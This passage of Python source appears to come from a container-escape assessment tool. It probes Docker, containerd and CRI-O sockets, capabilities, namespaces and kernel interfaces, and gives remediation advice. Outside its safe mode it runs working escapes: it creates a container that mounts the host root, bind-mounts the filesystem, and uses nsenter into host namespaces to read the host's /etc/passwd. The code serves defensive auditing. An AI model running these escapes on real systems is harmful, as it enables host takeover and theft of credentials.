"""Escape vector testing module."""
import os
import glob
import socket
import sys
import asyncio
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from plugins.docker_escape.proto import (
    ContainerEnvironment, EscapeOptions, EscapeMethod, EscapeStatus,
    SeverityLevel, EscapeAttemptResult, VulnerabilityFinding,
    CVEReference, VulnerabilityType
)
from modules.databases import CVE_DATABASE, K8S_PATHS, ALTERNATIVE_RUNTIME_ESCAPES, NAMESPACE_ESCAPES
from utils.async_subprocess import run_exec


class EscapeTester:
    """Tests various container escape vectors."""

    _DEFAULT_MAX_CONCURRENCY = 4

    async def _gather_with_semaphore(self, coros: List, *, limit: int = _DEFAULT_MAX_CONCURRENCY):
        """
        Run independent checks concurrently with bounded concurrency.
        Keeps result order stable (like sequential awaits).
        """
        sem = asyncio.Semaphore(limit)

        async def _run(coro):
            async with sem:
                return await coro

        return await asyncio.gather(*[_run(c) for c in coros])

    async def _test_socket_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test socket-based escape vectors."""
        coros = [
            self._try_docker_sock_escape(env, options),
            self._try_containerd_sock_escape(env, options),
            self._try_crio_sock_escape(env, options),
            self._try_docker_tcp_api(env, options),
        ]
        return await self._gather_with_semaphore(coros)

    async def _try_docker_sock_escape(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to escape via Docker socket."""
        sock_paths = ['/var/run/docker.sock', '/run/docker.sock']

        for sock_path in sock_paths:
            if not os.path.exists(sock_path):
                continue

            if not os.access(sock_path, os.R_OK | os.W_OK):
                return EscapeAttemptResult(
                    method=EscapeMethod.DOCKER_SOCK,
                    status=EscapeStatus.NOT_CAPABLE,
                    message=f"Docker socket exists but not accessible: {sock_path}",
                    severity=SeverityLevel.HIGH
                )

            try:
                import requests_unixsocket
                session = requests_unixsocket.Session()

                # Test API access
                encoded_path = sock_path.replace('/', '%2F')
                resp = session.get(f'http+unix://{encoded_path}/info')

                if resp.status_code != 200:
                    return EscapeAttemptResult(
                        method=EscapeMethod.DOCKER_SOCK,
                        status=EscapeStatus.VULNERABLE,
                        message="Docker socket accessible but API limited",
                        severity=SeverityLevel.HIGH
                    )

                if options.verify_only or options.safe_mode:
                    return EscapeAttemptResult(
                        method=EscapeMethod.DOCKER_SOCK,
                        status=EscapeStatus.VULNERABLE,
                        message="Docker socket fully accessible - escape possible",
                        severity=SeverityLevel.CRITICAL,
                        mitre_techniques=["T1611", "T1610"],
                        demo_next_steps="Can create privileged container with host mount",
                        remediation="Remove docker.sock mount from container"
                    )

                # Actual exploitation
                payload = {
                    "Image": "alpine",
                    "Cmd": ["cat", "/host/etc/passwd"],
                    "HostConfig": {"Binds": ["/:/host"]}
                }

                create_resp = session.post(
                    f'http+unix://{encoded_path}/containers/create',
                    json=payload
                )

                if create_resp.status_code != 201:
                    return EscapeAttemptResult(
                        method=EscapeMethod.DOCKER_SOCK,
                        status=EscapeStatus.VULNERABLE,
                        message=f"Container creation failed: {create_resp.text}",
                        severity=SeverityLevel.HIGH
                    )

                cid = create_resp.json()['Id']
                session.post(f'http+unix://{encoded_path}/containers/{cid}/start')
                await asyncio.sleep(1)
                logs_resp = session.get(f'http+unix://{encoded_path}/containers/{cid}/logs?stdout=1')
                host_passwd = logs_resp.text
                session.delete(f'http+unix://{encoded_path}/containers/{cid}?force=1')

                return EscapeAttemptResult(
                    method=EscapeMethod.DOCKER_SOCK,
                    status=EscapeStatus.EXPLOITED,
                    message="Successfully escaped via Docker socket",
                    severity=SeverityLevel.CRITICAL,
                    artifact_path="/host/etc/passwd",
                    artifact_content=host_passwd[:500] if host_passwd else None,
                    mitre_techniques=["T1611", "T1610"],
                    demo_next_steps="Full host access achieved via Docker daemon",
                    remediation="Remove docker.sock mount, use docker-proxy or rootless Docker"
                )

            except ImportError:
                # Try with curl fallback
                try:
                    rc, out, _ = await run_exec(
                        ['curl', '-s', '--unix-socket', sock_path, 'http://localhost/info'],
                        timeout=5,
                    )
                    if rc == 0 and (out or "").strip():
                        return EscapeAttemptResult(
                            method=EscapeMethod.DOCKER_SOCK,
                            status=EscapeStatus.VULNERABLE,
                            message="Docker socket accessible via curl",
                            severity=SeverityLevel.CRITICAL,
                            mitre_techniques=["T1611", "T1610"],
                            remediation="Remove docker.sock mount"
                        )
                except:
                    pass

                return EscapeAttemptResult(
                    method=EscapeMethod.DOCKER_SOCK,
                    status=EscapeStatus.VULNERABLE,
                    message="Docker socket accessible (install requests_unixsocket for exploitation)",
                    severity=SeverityLevel.CRITICAL
                )
            except Exception as e:
                return EscapeAttemptResult(
                    method=EscapeMethod.DOCKER_SOCK,
                    status=EscapeStatus.ERROR,
                    message=f"Error: {str(e)}",
                    severity=SeverityLevel.INFO
                )

        return EscapeAttemptResult(
            method=EscapeMethod.DOCKER_SOCK,
            status=EscapeStatus.NOT_FOUND,
            message="Docker socket not found",
            severity=SeverityLevel.INFO
        )

    async def _try_containerd_sock_escape(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to escape via containerd socket."""
        sock_path = '/run/containerd/containerd.sock'

        if not os.path.exists(sock_path):
            return EscapeAttemptResult(
                method=EscapeMethod.CONTAINERD_SOCK,
                status=EscapeStatus.NOT_FOUND,
                message="containerd socket not found",
                severity=SeverityLevel.INFO
            )

        if os.access(sock_path, os.R_OK | os.W_OK):
            # Check if ctr is available
            import shutil
            if shutil.which('ctr'):
                return EscapeAttemptResult(
                    method=EscapeMethod.CONTAINERD_SOCK,
                    status=EscapeStatus.VULNERABLE,
                    message="containerd socket accessible with ctr available",
                    severity=SeverityLevel.CRITICAL,
                    mitre_techniques=["T1611"],
                    demo_next_steps="Use ctr to create container with host mount",
                    remediation="Remove containerd socket mount"
                )

            return EscapeAttemptResult(
                method=EscapeMethod.CONTAINERD_SOCK,
                status=EscapeStatus.VULNERABLE,
                message="containerd socket accessible",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611"],
                remediation="Remove containerd socket mount"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.CONTAINERD_SOCK,
            status=EscapeStatus.NOT_CAPABLE,
            message="containerd socket not accessible",
            severity=SeverityLevel.INFO
        )

    async def _try_crio_sock_escape(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to escape via CRI-O socket."""
        sock_path = '/var/run/crio/crio.sock'

        if not os.path.exists(sock_path):
            return EscapeAttemptResult(
                method=EscapeMethod.CRIO_SOCK,
                status=EscapeStatus.NOT_FOUND,
                message="CRI-O socket not found",
                severity=SeverityLevel.INFO
            )

        if os.access(sock_path, os.R_OK | os.W_OK):
            return EscapeAttemptResult(
                method=EscapeMethod.CRIO_SOCK,
                status=EscapeStatus.VULNERABLE,
                message="CRI-O socket accessible",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611"],
                remediation="Remove CRI-O socket mount"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.CRIO_SOCK,
            status=EscapeStatus.NOT_CAPABLE,
            message="CRI-O socket not accessible",
            severity=SeverityLevel.INFO
        )

    async def _try_docker_tcp_api(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check for exposed Docker TCP API."""
        docker_ports = [2375, 2376, 2377]
        hosts_to_check = ['127.0.0.1', '172.17.0.1', 'host.docker.internal']

        for host in hosts_to_check:
            for port in docker_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    sock.close()

                    if result == 0:
                        return EscapeAttemptResult(
                            method=EscapeMethod.DOCKER_TCP,
                            status=EscapeStatus.VULNERABLE,
                            message=f"Docker API exposed on {host}:{port}",
                            severity=SeverityLevel.CRITICAL,
                            mitre_techniques=["T1611", "T1610"],
                            demo_next_steps=f"Connect to http://{host}:{port} for Docker API access",
                            remediation="Disable Docker TCP API or use TLS"
                        )
                except:
                    continue

        return EscapeAttemptResult(
            method=EscapeMethod.DOCKER_TCP,
            status=EscapeStatus.NOT_FOUND,
            message="No exposed Docker TCP API found",
            severity=SeverityLevel.INFO
        )

    async def _test_capability_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test capability-based escape vectors."""
        coros = [
            self._try_cap_sys_admin(env, options),
            self._try_cap_sys_ptrace(env, options),
            self._try_cap_sys_module(env, options),
            self._try_cap_net_admin(env, options),
            self._try_cap_mknod(env, options),
            self._try_cap_dac_override(env, options),
        ]

        if env.kernel.has_ebpf:
            coros.append(self._try_cap_bpf(env, options))

        coros.extend([
            self._try_privileged_container(env, options),
            self._try_device_access(env, options),
        ])

        return await self._gather_with_semaphore(coros)

    async def _try_cap_sys_admin(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to escape using CAP_SYS_ADMIN capability."""
        if "CAP_SYS_ADMIN" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_SYS_ADMIN,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_SYS_ADMIN capability not available",
                severity=SeverityLevel.INFO
            )

        escape_paths = []

        # Check core_pattern
        if os.access('/proc/sys/kernel/core_pattern', os.W_OK):
            escape_paths.append("core_pattern")

        # Check release_agent
        for ra_path in glob.glob('/sys/fs/cgroup/*/release_agent'):
            if os.access(ra_path, os.W_OK):
                escape_paths.append(f"release_agent ({ra_path})")

        # Check mount capability
        import shutil
        if shutil.which('mount'):
            escape_paths.append("mount")

        if options.verify_only or options.safe_mode:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_SYS_ADMIN,
                status=EscapeStatus.VULNERABLE,
                message=f"CAP_SYS_ADMIN available - escape paths: {', '.join(escape_paths) if escape_paths else 'mount-based'}",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611", "T1068"],
                demo_next_steps="Can mount host filesystem, abuse core_pattern, or cgroup release_agent",
                remediation="Drop CAP_SYS_ADMIN capability"
            )

        # Try mount-based escape
        try:
            os.makedirs('/tmp/escape_mount', exist_ok=True)
            rc, _, _ = await run_exec(['mount', '--bind', '/', '/tmp/escape_mount'], timeout=5)

            if rc == 0:
                passwd_path = '/tmp/escape_mount/etc/passwd'
                content = None
                if os.path.exists(passwd_path):
                    with open(passwd_path, 'r') as f:
                        content = f.read()[:500]
                await run_exec(['umount', '/tmp/escape_mount'], timeout=5)

                return EscapeAttemptResult(
                    method=EscapeMethod.CAP_SYS_ADMIN,
                    status=EscapeStatus.EXPLOITED,
                    message="Successfully mounted filesystem via CAP_SYS_ADMIN",
                    severity=SeverityLevel.CRITICAL,
                    artifact_content=content,
                    mitre_techniques=["T1611", "T1068"],
                    remediation="Drop CAP_SYS_ADMIN capability"
                )
        except Exception as e:
            pass

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_SYS_ADMIN,
            status=EscapeStatus.VULNERABLE,
            message="CAP_SYS_ADMIN present but mount failed",
            severity=SeverityLevel.HIGH
        )

    async def _try_cap_sys_ptrace(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_SYS_PTRACE capability for process injection."""
        if "CAP_SYS_PTRACE" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_SYS_PTRACE,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_SYS_PTRACE not available",
                severity=SeverityLevel.INFO
            )

        # Check if host PID namespace (makes this more dangerous)
        extra_risk = ""
        if env.has_host_pid:
            extra_risk = " (HOST PID NAMESPACE - can inject into any host process!)"

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_SYS_PTRACE,
            status=EscapeStatus.VULNERABLE,
            message=f"CAP_SYS_PTRACE available - process injection possible{extra_risk}",
            severity=SeverityLevel.CRITICAL if env.has_host_pid else SeverityLevel.HIGH,
            mitre_techniques=["T1055", "T1611"],
            demo_next_steps="Can inject code into processes via ptrace or /proc/[pid]/mem",
            remediation="Drop CAP_SYS_PTRACE capability"
        )

    async def _try_cap_sys_module(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_SYS_MODULE for kernel module loading."""
        if "CAP_SYS_MODULE" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_SYS_MODULE,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_SYS_MODULE not available",
                severity=SeverityLevel.INFO
            )

        import shutil
        has_insmod = shutil.which('insmod') or shutil.which('modprobe')

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_SYS_MODULE,
            status=EscapeStatus.VULNERABLE,
            message=f"CAP_SYS_MODULE available - kernel module loading possible (insmod: {has_insmod})",
            severity=SeverityLevel.CRITICAL,
            mitre_techniques=["T1547.006", "T1014", "T1611"],
            demo_next_steps="Can load malicious kernel module for ring-0 access",
            remediation="Drop CAP_SYS_MODULE capability"
        )

    async def _try_cap_net_admin(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_NET_ADMIN capability."""
        if "CAP_NET_ADMIN" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_NET_ADMIN,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_NET_ADMIN not available",
                severity=SeverityLevel.INFO
            )

        import shutil
        tools = []
        if shutil.which('iptables'):
            tools.append('iptables')
        if shutil.which('ip'):
            tools.append('ip')
        if shutil.which('tc'):
            tools.append('tc')

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_NET_ADMIN,
            status=EscapeStatus.VULNERABLE,
            message=f"CAP_NET_ADMIN available - network manipulation possible (tools: {', '.join(tools)})",
            severity=SeverityLevel.HIGH,
            mitre_techniques=["T1557", "T1040", "T1562"],
            demo_next_steps="Can manipulate iptables, perform MITM, ARP spoofing",
            remediation="Drop CAP_NET_ADMIN capability"
        )

    async def _try_cap_mknod(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_MKNOD for device node creation."""
        if "CAP_MKNOD" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_MKNOD,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_MKNOD not available",
                severity=SeverityLevel.INFO
            )

        import shutil
        if not shutil.which('mknod'):
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_MKNOD,
                status=EscapeStatus.POSSIBLE,
                message="CAP_MKNOD available but mknod binary not found",
                severity=SeverityLevel.MEDIUM
            )

        if options.safe_mode:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_MKNOD,
                status=EscapeStatus.VULNERABLE,
                message="CAP_MKNOD + mknod available - device creation possible",
                severity=SeverityLevel.HIGH,
                mitre_techniques=["T1068"],
                demo_next_steps="Can create device nodes for disk access (e.g., /dev/sda)",
                remediation="Drop CAP_MKNOD capability"
            )

        # Try to create a test device
        try:
            test_device = '/tmp/test_device_escape'
            rc, _, _ = await run_exec(['mknod', test_device, 'b', '8', '0'], timeout=5)

            if rc == 0:
                os.remove(test_device)
                return EscapeAttemptResult(
                    method=EscapeMethod.CAP_MKNOD,
                    status=EscapeStatus.EXPLOITED,
                    message="Successfully created device node",
                    severity=SeverityLevel.CRITICAL,
                    mitre_techniques=["T1068"],
                    demo_next_steps="Can create /dev/sda equivalent for disk access",
                    remediation="Drop CAP_MKNOD capability"
                )
        except:
            pass

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_MKNOD,
            status=EscapeStatus.VULNERABLE,
            message="CAP_MKNOD available but device creation blocked",
            severity=SeverityLevel.MEDIUM
        )

    async def _try_cap_dac_override(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_DAC_OVERRIDE for file permission bypass."""
        if "CAP_DAC_OVERRIDE" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CAP_DAC_OVERRIDE,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_DAC_OVERRIDE not available",
                severity=SeverityLevel.INFO
            )

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_DAC_OVERRIDE,
            status=EscapeStatus.VULNERABLE,
            message="CAP_DAC_OVERRIDE available - can bypass file permissions",
            severity=SeverityLevel.HIGH,
            mitre_techniques=["T1068", "T1083"],
            demo_next_steps="Can read/write any file in container",
            remediation="Drop CAP_DAC_OVERRIDE capability"
        )

    async def _try_cap_bpf(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check CAP_BPF for eBPF exploitation."""
        if "CAP_BPF" not in env.effective_caps:
            # CAP_BPF may be included in CAP_SYS_ADMIN on older kernels
            if "CAP_SYS_ADMIN" not in env.effective_caps:
                return EscapeAttemptResult(
                    method=EscapeMethod.CAP_BPF,
                    status=EscapeStatus.NOT_CAPABLE,
                    message="CAP_BPF/CAP_SYS_ADMIN not available",
                    severity=SeverityLevel.INFO
                )

        return EscapeAttemptResult(
            method=EscapeMethod.CAP_BPF,
            status=EscapeStatus.VULNERABLE,
            message="BPF capability available - kernel exploitation possible",
            severity=SeverityLevel.CRITICAL,
            mitre_techniques=["T1068", "T1611"],
            demo_next_steps="Can load eBPF programs for kernel exploitation",
            remediation="Drop CAP_BPF, set kernel.unprivileged_bpf_disabled=1"
        )

    async def _try_privileged_container(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check and exploit privileged container mode."""
        if not env.is_privileged:
            return EscapeAttemptResult(
                method=EscapeMethod.PRIVILEGED_CONTAINER,
                status=EscapeStatus.NOT_VULNERABLE,
                message="Container not running in privileged mode",
                severity=SeverityLevel.INFO
            )

        return EscapeAttemptResult(
            method=EscapeMethod.PRIVILEGED_CONTAINER,
            status=EscapeStatus.VULNERABLE,
            message="Container running in privileged mode - multiple escape vectors available",
            severity=SeverityLevel.CRITICAL,
            mitre_techniques=["T1611", "T1068"],
            demo_next_steps="Can access devices, mount filesystems, load kernel modules, abuse core_pattern",
            remediation="Remove --privileged flag, use specific capabilities instead"
        )

    async def _try_device_access(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check for dangerous device access."""
        dangerous_devices = {
            '/dev/sda': 'Primary disk',
            '/dev/sda1': 'Primary partition',
            '/dev/nvme0n1': 'NVMe disk',
            '/dev/mem': 'Physical memory',
            '/dev/kmem': 'Kernel memory',
            '/dev/port': 'I/O ports'
        }

        accessible = []
        for device, desc in dangerous_devices.items():
            if os.path.exists(device) and os.access(device, os.R_OK):
                accessible.append(f"{device} ({desc})")

        if accessible:
            return EscapeAttemptResult(
                method=EscapeMethod.DEVICE_ACCESS,
                status=EscapeStatus.VULNERABLE,
                message=f"Dangerous devices accessible: {', '.join(accessible)}",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1068", "T1003"],
                demo_next_steps="Can read raw disk or memory for data extraction",
                remediation="Use device cgroup, remove --privileged"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.DEVICE_ACCESS,
            status=EscapeStatus.NOT_VULNERABLE,
            message="No dangerous devices accessible",
            severity=SeverityLevel.INFO
        )

    async def _test_namespace_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test namespace-based escape vectors."""
        coros = [
            self._try_nsenter(env, options),
            self._try_proc_root(env, options),
            self._try_host_mount(env, options),
            self._try_host_pid_namespace(env, options),
            self._try_host_network_namespace(env, options),
        ]

        results = await self._gather_with_semaphore(coros)

        # Also include generic namespace escape techniques catalog (was previously overwriting this method by name).
        results.extend(await self._test_namespace_escape_catalog(env, options))
        return results

    async def _try_nsenter(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to escape using nsenter."""
        import shutil

        if not shutil.which('nsenter'):
            return EscapeAttemptResult(
                method=EscapeMethod.NSENTER,
                status=EscapeStatus.NOT_FOUND,
                message="nsenter not available",
                severity=SeverityLevel.INFO
            )

        if "CAP_SYS_ADMIN" not in env.effective_caps and not env.is_privileged:
            return EscapeAttemptResult(
                method=EscapeMethod.NSENTER,
                status=EscapeStatus.NOT_CAPABLE,
                message="nsenter available but CAP_SYS_ADMIN missing",
                severity=SeverityLevel.MEDIUM,
                remediation="Remove nsenter binary"
            )

        if options.verify_only or options.safe_mode:
            return EscapeAttemptResult(
                method=EscapeMethod.NSENTER,
                status=EscapeStatus.VULNERABLE,
                message="nsenter + CAP_SYS_ADMIN available - namespace escape possible",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611"],
                demo_next_steps="Can enter host namespaces",
                remediation="Remove nsenter binary, use seccomp to block setns"
            )

        try:
            cmd = ['nsenter', '--target', '1', '--mount', '--uts', '--ipc', '--net', '--pid', '--', 'id']
            rc, out, _ = await run_exec(cmd, timeout=5)

            if rc == 0 and 'uid=' in (out or ""):
                return EscapeAttemptResult(
                    method=EscapeMethod.NSENTER,
                    status=EscapeStatus.EXPLOITED,
                    message="Successfully entered host namespaces",
                    severity=SeverityLevel.CRITICAL,
                    artifact_content=out or "",
                    mitre_techniques=["T1611"],
                    remediation="Use user namespaces, drop CAP_SYS_ADMIN"
                )
        except:
            pass

        return EscapeAttemptResult(
            method=EscapeMethod.NSENTER,
            status=EscapeStatus.VULNERABLE,
            message="nsenter available but namespace escape failed",
            severity=SeverityLevel.HIGH
        )

    async def _try_proc_root(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to access host via /proc/1/root."""
        proc_root = '/proc/1/root'
        target_file = f'{proc_root}/etc/passwd'

        if not os.path.exists(proc_root):
            return EscapeAttemptResult(
                method=EscapeMethod.PROC_ROOT_CHROOT,
                status=EscapeStatus.NOT_FOUND,
                message="/proc/1/root not found",
                severity=SeverityLevel.INFO
            )

        try:
            if os.path.exists(target_file) and os.access(target_file, os.R_OK):
                content = None
                if options.collect_artifacts:
                    with open(target_file, 'r') as f:
                        content = f.read()[:options.max_artifact_size]

                return EscapeAttemptResult(
                    method=EscapeMethod.PROC_ROOT_CHROOT,
                    status=EscapeStatus.EXPLOITED,
                    message="Host filesystem accessible via /proc/1/root",
                    technical_details=(
                        f"Confirmed read access to `{target_file}`. This usually means PID 1 in the container "
                        "shares the host's mount namespace or the container is privileged — not necessarily an "
                        "attacker-controlled breakout, but host filesystem exposure from inside the container."
                    ),
                    severity=SeverityLevel.CRITICAL,
                    artifact_path=target_file,
                    artifact_content=content,
                    mitre_techniques=["T1611", "T1083"],
                    demo_next_steps="Can read/write host files, extract secrets",
                    remediation="Use user namespaces, restrict /proc access with seccomp"
                )
        except PermissionError:
            return EscapeAttemptResult(
                method=EscapeMethod.PROC_ROOT_CHROOT,
                status=EscapeStatus.NOT_CAPABLE,
                message="Permission denied accessing /proc/1/root",
                severity=SeverityLevel.INFO
            )
        except Exception as e:
            return EscapeAttemptResult(
                method=EscapeMethod.PROC_ROOT_CHROOT,
                status=EscapeStatus.ERROR,
                message=str(e),
                severity=SeverityLevel.INFO
            )

        return EscapeAttemptResult(
            method=EscapeMethod.PROC_ROOT_CHROOT,
            status=EscapeStatus.NOT_VULNERABLE,
            message="Cannot access host via /proc/1/root",
            severity=SeverityLevel.INFO
        )

    async def _try_host_mount(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check for dangerous host mounts."""
        mount_paths = ['/host', '/mnt/host', '/host_root', '/rootfs', '/hostfs']

        for mount_path in mount_paths:
            passwd_path = f'{mount_path}/etc/passwd'
            try:
                if os.path.isdir(mount_path) and os.path.exists(passwd_path):
                    content = None
                    if options.collect_artifacts:
                        with open(passwd_path, 'r') as f:
                            content = f.read()[:options.max_artifact_size]

                    return EscapeAttemptResult(
                        method=EscapeMethod.HOST_MOUNT,
                        status=EscapeStatus.EXPLOITED,
                        message=f"Host filesystem mounted at {mount_path}",
                        severity=SeverityLevel.CRITICAL,
                        artifact_path=passwd_path,
                        artifact_content=content,
                        mitre_techniques=["T1611", "T1083"],
                        demo_next_steps="Full host filesystem access available",
                        remediation="Remove host mount, use specific paths with read-only"
                    )
            except:
                continue

        return EscapeAttemptResult(
            method=EscapeMethod.HOST_MOUNT,
            status=EscapeStatus.NOT_FOUND,
            message="No dangerous host mounts detected",
            severity=SeverityLevel.INFO
        )

    async def _try_host_pid_namespace(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check for host PID namespace."""
        if env.has_host_pid:
            return EscapeAttemptResult(
                method=EscapeMethod.HOST_PID,
                status=EscapeStatus.VULNERABLE,
                message="Container using host PID namespace - can see and interact with host processes",
                severity=SeverityLevel.HIGH,
                mitre_techniques=["T1055", "T1057"],
                demo_next_steps="Can see host processes, inject with CAP_SYS_PTRACE",
                remediation="Don't use --pid=host"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.HOST_PID,
            status=EscapeStatus.NOT_VULNERABLE,
            message="Container has isolated PID namespace",
            severity=SeverityLevel.INFO
        )

    async def _try_host_network_namespace(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check for host network namespace."""
        if env.has_host_network:
            return EscapeAttemptResult(
                method=EscapeMethod.HOST_NETWORK,
                status=EscapeStatus.VULNERABLE,
                message="Container using host network namespace - can access host network stack",
                severity=SeverityLevel.HIGH,
                mitre_techniques=["T1040", "T1557"],
                demo_next_steps="Can sniff traffic, access local services",
                remediation="Don't use --network=host"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.HOST_NETWORK,
            status=EscapeStatus.NOT_VULNERABLE,
            message="Container has isolated network namespace",
            severity=SeverityLevel.INFO
        )

    async def _test_kernel_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test kernel-based escape vectors."""
        coros = [
            self._try_core_pattern(env, options),
            self._try_modprobe_path(env, options),
            self._try_uevent_helper(env, options),
            self._try_cgroup_release_agent(env, options),
            self._try_proc_kcore(env, options),
        ]
        return await self._gather_with_semaphore(coros)

    async def _try_core_pattern(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try core_pattern escape."""
        path = '/proc/sys/kernel/core_pattern'

        if not os.path.exists(path):
            return EscapeAttemptResult(
                method=EscapeMethod.CORE_PATTERN,
                status=EscapeStatus.NOT_FOUND,
                message="core_pattern not accessible",
                severity=SeverityLevel.INFO
            )

        if not os.access(path, os.W_OK):
            return EscapeAttemptResult(
                method=EscapeMethod.CORE_PATTERN,
                status=EscapeStatus.NOT_CAPABLE,
                message="core_pattern not writable",
                severity=SeverityLevel.INFO
            )

        return EscapeAttemptResult(
            method=EscapeMethod.CORE_PATTERN,
            status=EscapeStatus.VULNERABLE,
            message="core_pattern is writable - command execution on crash possible",
            severity=SeverityLevel.CRITICAL,
            mitre_techniques=["T1611", "T1059"],
            demo_next_steps="Write |/path/to/payload to core_pattern, trigger crash",
            remediation="Mount /proc/sys read-only, drop CAP_SYS_ADMIN"
        )

    async def _try_modprobe_path(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try modprobe_path escape."""
        path = '/proc/sys/kernel/modprobe'

        if not os.path.exists(path):
            return EscapeAttemptResult(
                method=EscapeMethod.MODPROBE_PATH,
                status=EscapeStatus.NOT_FOUND,
                message="modprobe path not accessible",
                severity=SeverityLevel.INFO
            )

        if os.access(path, os.W_OK):
            return EscapeAttemptResult(
                method=EscapeMethod.MODPROBE_PATH,
                status=EscapeStatus.VULNERABLE,
                message="modprobe path is writable - command execution possible",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611", "T1059"],
                demo_next_steps="Change modprobe path to payload, trigger module load",
                remediation="Mount /proc/sys read-only"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.MODPROBE_PATH,
            status=EscapeStatus.NOT_CAPABLE,
            message="modprobe path not writable",
            severity=SeverityLevel.INFO
        )

    async def _try_uevent_helper(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try uevent_helper escape."""
        path = '/sys/kernel/uevent_helper'

        if not os.path.exists(path):
            return EscapeAttemptResult(
                method=EscapeMethod.UEVENT_HELPER,
                status=EscapeStatus.NOT_FOUND,
                message="uevent_helper not accessible",
                severity=SeverityLevel.INFO
            )

        if os.access(path, os.W_OK):
            return EscapeAttemptResult(
                method=EscapeMethod.UEVENT_HELPER,
                status=EscapeStatus.VULNERABLE,
                message="uevent_helper is writable - command execution on device events",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1611", "T1059"],
                demo_next_steps="Write payload path to uevent_helper, trigger device event",
                remediation="Mount /sys read-only"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.UEVENT_HELPER,
            status=EscapeStatus.NOT_CAPABLE,
            message="uevent_helper not writable",
            severity=SeverityLevel.INFO
        )

    async def _try_cgroup_release_agent(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try cgroup release_agent escape (CVE-2022-0492 style)."""
        if "CAP_SYS_ADMIN" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.CGROUP_RELEASE_AGENT,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_SYS_ADMIN required for cgroup escape",
                severity=SeverityLevel.INFO
            )

        # Check for cgroup v1 release_agent
        writable_agents = []
        for path in glob.glob('/sys/fs/cgroup/*/release_agent'):
